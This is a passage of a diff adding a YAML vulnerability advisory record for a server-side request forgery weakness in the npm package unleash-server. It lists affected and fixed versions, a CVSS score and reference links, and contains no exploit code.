+      - pkg:npm/unleash-server@7.6.0
+      - pkg:npm/unleash-server@7.6.1
+      - pkg:npm/unleash-server@7.6.2
+      - pkg:npm/unleash-server@7.6.3
+      - pkg:npm/unleash-server@7.6.4
+      - pkg:npm/unleash-server@7.6.5-beta.0
+      - pkg:npm/unleash-server@7.6.5-beta.1
+      - pkg:npm/unleash-server@7.6.5-beta.2
+    fixed_packages:
+      - pkg:npm/unleash-server@7.6.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/unleash-server
+    affected_versions: vers:npm/>=8.0.0|<8.0.2
+    fixed_versions: vers:npm/8.0.2
+    affected_packages:
+      - pkg:npm/unleash-server@8.0.0
+      - pkg:npm/unleash-server@8.0.1
+    fixed_packages:
+      - pkg:npm/unleash-server@8.0.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-5vf6-jrqr-78fj/GHSA-5vf6-jrqr-78fj.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/Unleash/unleash
+    reference_type:
+    reference_id:
+  - url: https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1
+    reference_type: other
+    reference_id: 2100db76af3473f13e6fb40096cf17a9c2b741a1
+  - url: https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1
+    reference_type: other
+    reference_id: d45f99df924c0d24747b3e45e46fcda7dcd3c1c1
+  - url: https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d
+    reference_type: other
+    reference_id: d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d
+  - url: https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj
+    reference_type: other
+    reference_id: GHSA-5vf6-jrqr-78fj
+  - url: https://github.com/Unleash/unleash/releases/tag/v7.5.2
+    reference_type: other
+    reference_id: v7.5.2
+  - url: https://github.com/Unleash/unleash/releases/tag/v7.6.5
+    reference_type: other
+    reference_id: v7.6.5
+  - url: https://github.com/Unleash/unleash/releases/tag/v8.0.2
+    reference_type: other
+    reference_id: v8.0.2
+exploits: []
